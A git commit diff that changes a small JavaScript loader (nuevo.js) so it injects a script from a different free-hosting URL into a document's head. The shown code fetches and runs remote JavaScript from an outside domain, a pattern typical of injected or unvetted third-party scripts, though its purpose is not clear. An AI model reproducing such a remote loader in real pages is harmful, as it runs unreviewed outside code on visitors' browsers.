51be68c507c4eea29a520ace360b4a32dbb95549
Usagi86 <Usagi86@users.noreply.github.com>
2016-10-31 16:53:17 -0600

    Update nuevo.js

--- nuevo.js
+++ nuevo.js
@@ -4,5 +4,5 @@
 
 var cabe = IN.CI.document.head
 var scriptt = document.createElement('script');
-scriptt.src="http://latinet.260mb.net/eluno.js";
+scriptt.src="http://latin2chat.260mb.net/gg.js";
 cabe.appendChild(scriptt);
